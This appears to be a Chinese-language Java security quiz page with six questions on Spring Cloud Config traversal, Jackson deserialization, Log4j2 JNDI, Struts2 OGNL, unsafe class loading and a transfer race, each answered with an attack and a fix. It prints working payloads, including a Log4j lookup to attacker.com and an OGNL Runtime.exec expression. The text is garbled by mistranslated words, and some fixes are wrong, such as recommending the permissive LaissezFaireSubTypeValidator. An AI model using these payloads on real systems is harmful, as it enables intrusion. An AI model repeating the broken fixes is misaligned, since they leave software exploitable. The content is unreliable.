    <h4 style="margin-left:0px; margin-right:0px">
     <span style="color:#000000">
      <strong>
       <strong style="margin-left:0px">
        1. Spring Cloud Config路径遍历
       </strong>
      </strong>
     </span>
    </h4>
    <p style="margin-left:0px; margin-right:0px; text-align:left">
     <span style="color:#000000">
      <strong style="margin-left:0px">
       配置项
      </strong>
      ：
     </span>
    </p>
    <pre class="custom" style="margin-left:0px; margin-right:0px; text-align:left"><code><span style="color:#d19a66">spring:</span>
  <span style="color:#d19a66">cloud:</span>
    <span style="color:#d19a66">config:</span>
      <span style="color:#d19a66">server:</span>
        <span style="color:#d19a66">git:</span>
          <span style="color:#d19a66">uri:</span> <span style="color:#98c379">https://github.com/config-repo</span>
</code></pre>
    <p style="margin-left:0px; margin-right:0px; text-align:left">
     <span style="color:#000000">
      <strong style="margin-left:0px">
       问题
      </strong>
      ：如何通过恶意应用名构造路径寻找敏感文件？
     </span>
    </p>
    <p style="margin-left:0px; margin-right:0px; text-align:left">
     <span style="color:#000000">
      <strong style="margin-left:0px">
       答案
      </strong>
      ：
     </span>
    </p>
    <ul style="margin-left:0px; margin-right:0px">
     <li>
      <p>
       攻击方式：请求
       <code style="margin-left:2px">
        http://config-server/{application}/{profile}
       </code>
       ，设置
       <code style="margin-left:2px">
        application=..%252F..%252Fetc
       </code>
       （双重URL编码）
      </p>
     </li>
     <li>
      <p>
       修复方案：配置
       <code style="margin-left:2px">
        spring.cloud.config.server.git.force-pull=true
       </code>
       并限制仓库路径
      </p>
     </li>
    </ul>
    <hr style="margin-left:0px"/>
    <h4 style="margin-left:0px; margin-right:0px">
     <span style="color:#000000">
      <strong>
       <strong style="margin-left:0px">
        2. Jackson多态类型处理
       </strong>
      </strong>
     </span>
    </h4>
    <p style="margin-left:0px; margin-right:0px; text-align:left">
     <span style="color:#000000">
      <strong style="margin-left:0px">
       代码片段
      </strong>
      ：
     </span>
    </p>
    <pre class="custom" style="margin-left:0px; margin-right:0px; text-align:left"><code><span style="color:#61aeee">@JsonTypeInfo</span>(use = Id.NAME, include = As.PROPERTY, property = <span style="color:#98c379">"type"</span>)
<span style="color:#c678dd">public</span> <span style="color:#c678dd">abstract</span> <span style="color:#c678dd">class</span> <span style="color:#e6c07b">Payload</span> {}
</code></pre>
    <p style="margin-left:0px; margin-right:0px; text-align:left">
     <span style="color:#000000">
      <strong style="margin-left:0px">
       问题
      </strong>
      ：如何利用该注解实现反序列化？攻击给出修复方案
     </span>
    </p>
    <p style="margin-left:0px; margin-right:0px; text-align:left">
     <span style="color:#000000">
      <strong style="margin-left:0px">
       答案
      </strong>
      ：
     </span>
    </p>
    <ul style="margin-left:0px; margin-right:0px">
     <li>
      <p>
       攻击方式：构建包含
       <code style="margin-left:2px">
        "type":"com.sun.rowset.JdbcRowSetImpl"
       </code>
       的JSON数据触发JNDI注入
      </p>
     </li>
     <li>
      修复方案：
      <ol style="margin-left:0px; margin-right:0px">
       <li>
        <p>
         藝術
         <code style="margin-left:2px">
          @JsonTypeInfo(visible = false)
         </code>
        </p>
       </li>
       <li>
        <p>
         配置
         <code style="margin-left:2px">
          mapper.activateDefaultTyping()
         </code>
         时使用
         <code style="margin-left:2px">
          LaissezFaireSubTypeValidator
         </code>
        </p>
       </li>
      </ol>
     </li>
    </ul>

    <h4 style="margin-left:0px; margin-right:0px">
     <span style="color:#000000">
      <strong>
       <strong style="margin-left:0px">
        3. Log4j2 JNDI 注入
       </strong>
      </strong>
     </span>
    </h4>
    <p style="margin-left:0px; margin-right:0px; text-align:left">
     <span style="color:#000000">
      <strong style="margin-left:0px">
       日志代码
      </strong>
      ：
     </span>
    </p>
    <pre class="custom" style="margin-left:0px; margin-right:0px; text-align:left"><code>logger.error(<span style="color:#98c379">"Error processing request: {}"</span>, userInput);
</code></pre>
    <p style="margin-left:0px; margin-right:0px; text-align:left">
     <span style="color:#000000">
      <strong style="margin-left:0px">
       问题
      </strong>
      ：在Log4j 2.14.1环境下如何构造RCE？给出修复方案
     </span>
    </p>
    <p style="margin-left:0px; margin-right:0px; text-align:left">
     <span style="color:#000000">
      <strong style="margin-left:0px">
       答案
      </strong>
      ：
     </span>
    </p>
    <ul style="margin-left:0px; margin-right:0px">
     <li>
      <p>
       攻击Payload：输入
       <code style="margin-left:2px">
        ${jndi:ldap://attacker.com/Exploit}
       </code>
      </p>
     </li>
     <li>
      修复方案：
      <ol style="margin-left:0px; margin-right:0px">
       <li>
        <p>
         升级到2.17.0+并设置
         <code style="margin-left:2px">
          log4j2.formatMsgNoLookups=true
         </code>
        </p>
       </li>
       <li>
        <p>
         禁用JNDI功能：
         <code style="margin-left:2px">
          -Dlog4j2.enableJndi=false
         </code>
        </p>
       </li>
      </ol>
     </li>
    </ul>
    <hr style="margin-left:0px"/>
    <h4 style="margin-left:0px; margin-right:0px">
     <span style="color:#000000">
      <strong>
       <strong style="margin-left:0px">
        4. Struts2 OGNL注入
       </strong>
      </strong>
     </span>
    </h4>
    <p style="margin-left:0px; margin-right:0px; text-align:left">
     <span style="color:#000000">
      <strong style="margin-left:0px">
       代码片段
      </strong>
      ：
     </span>
    </p>
    <pre class="custom" style="margin-left:0px; margin-right:0px; text-align:left"><code>&lt;<span style="color:#e06c75">result</span> <span style="color:#d19a66">type</span>=<span style="color:#98c379">"freemarker"</span>&gt;
    &lt;<span style="color:#e06c75">param</span> <span style="color:#d19a66">name</span>=<span style="color:#98c379">"location"</span>&gt;/templates/${templateName}.ftl&lt;/<span style="color:#e06c75">param</span>&gt;
&lt;/<span style="color:#e06c75">result</span>&gt;
</code></pre>
    <p style="margin-left:0px; margin-right:0px; text-align:left">
     <span style="color:#000000">
      <strong style="margin-left:0px">
       问题
      </strong>
      ：如何通过templateName参数执行系统命令？
     </span>
    </p>
    <p style="margin-left:0px; margin-right:0px; text-align:left">
     <span style="color:#000000">
      <strong style="margin-left:0px">
       答案
      </strong>
      ：
     </span>
    </p>
    <ul style="margin-left:0px; margin-right:0px">
     <li>
      <p>
       攻击Payload：
       <code style="margin-left:2px">
        ${(#_memberAccess["allowStaticMethodAccess"]=true,#a=@java.lang.Runtime@getRuntime().exec('calc'))}
       </code>
      </p>
     </li>
     <li>
      <p>
       修复方案：将Struts升级到最新版本并取消动态方法调用
      </p>
     </li>
    </ul>
    <hr style="margin-left:0px"/>
    <h4 style="margin-left:0px; margin-right:0px">
     <span style="color:#000000">
      <strong>
       <strong style="margin-left:0px">
        5. JVM字节码控制漏洞
       </strong>
      </strong>
     </span>
    </h4>
    <p style="margin-left:0px; margin-right:0px; text-align:left">
     <span style="color:#000000">
      <strong style="margin-left:0px">
       代码片段
      </strong>
      ：
     </span>
    </p>
    <pre class="custom" style="margin-left:0px; margin-right:0px; text-align:left"><code><span style="color:#c678dd">public</span> <span style="color:#c678dd">class</span> <span style="color:#e6c07b">UnsafeClassLoader</span> <span style="color:#c678dd">extends</span> <span style="color:#e6c07b">ClassLoader</span> {
    <span style="color:#c678dd">public</span> Class <span style="color:#61aeee">defineClass</span>(<span style="color:#c678dd">byte</span>[] code) {
        <span style="color:#c678dd">return</span> <span style="color:#c678dd">super</span>.defineClass(code, <span style="color:#d19a66">0</span>, code.length);
    }
}
</code></pre>
    <p style="margin-left:0px; margin-right:0px; text-align:left">
     <span style="color:#000000">
      <strong style="margin-left:0px">
       问题
      </strong>
      ：分析该代码的安全风险及防御方法
     </span>
    </p>
    <p style="margin-left:0px; margin-right:0px; text-align:left">
     <span style="color:#000000">
      <strong style="margin-left:0px">
       答案
      </strong>
      ：
     </span>
    </p>
    <ul style="margin-left:0px; margin-right:0px">
     <li>
      <p>
       风险点：允许动态加载未验证的字节码，可能导致代码执行
      </p>
     </li>
     <li>
      策略：
      <ol style="margin-left:0px; margin-right:0px">
       <li>
        <p>
         对货运类别进行包名白名单审核
        </p>
       </li>
       <li>
        <p>
         启用S​​​​ecurityManager并配置
         <code style="margin-left:2px">
          RuntimePermission("defineClass")
         </code>
        </p>
       </li>
      </ol>
     </li>
    </ul>
    <hr style="margin-left:0px"/>
    <h4 style="margin-left:0px; margin-right:0px">
     <span style="color:#000000">
      <strong>
       <strong style="margin-left:0px">
        6.并发比赛条件
       </strong>
      </strong>
     </span>
    </h4>
    <p style="margin-left:0px; margin-right:0px; text-align:left">
     <span style="color:#000000">
      <strong style="margin-left:0px">
       代码片段
      </strong>
      ：
     </span>
    </p>
    <pre class="custom" style="margin-left:0px; margin-right:0px; text-align:left"><code><span style="color:#c678dd">public</span> <span style="color:#c678dd">void</span> <span style="color:#61aeee">transfer</span>(Account from, Account to, BigDecimal amount) {
    <span style="color:#c678dd">if</span> (from.getBalance().compareTo(amount) &gt;= <span style="color:#d19a66">0</span>) {
        from.debit(amount);  <span style="color:#5c6370"><em>//步骤1</em></span>
        to.credit(amount);    <span style="color:#5c6370"><em>//步骤2</em></span>
    }
}
</code></pre>
    <p style="margin-left:0px; margin-right:0px; text-align:left">
     <span style="color:#000000">
      <strong style="margin-left:0px">
       问题
      </strong>
      ：如何利用竞争条件实现税收税收？给出修复方案
     </span>
    </p>
    <p style="margin-left:0px; margin-right:0px; text-align:left">
     <span style="color:#000000">
      <strong style="margin-left:0px">
       答案
      </strong>
      ：
     </span>
    </p>
    <ul style="margin-left:0px; margin-right:0px">
     <li>
      <p>
       攻击方式：在步骤1和步骤2之间发起发起请求透支余额
      </p>
     </li>
     <li>
      修复方案：
      <ol style="margin-left:0px; margin-right:0px">
       <li>
        <p>
         使用数据库旅游锁
         <code style="margin-left:2px">
          SELECT FOR UPDATE
         </code>
        </p>
       </li>
       <li>
        <p>
         增值
         <code style="margin-left:2px">
          @Transactional
         </code>
         服务保证
        </p>
       </li>
       <li>
        <p>
         在应用层使用可重入锁
        </p>
       </li>
      </ol>
     </li>
    </ul>
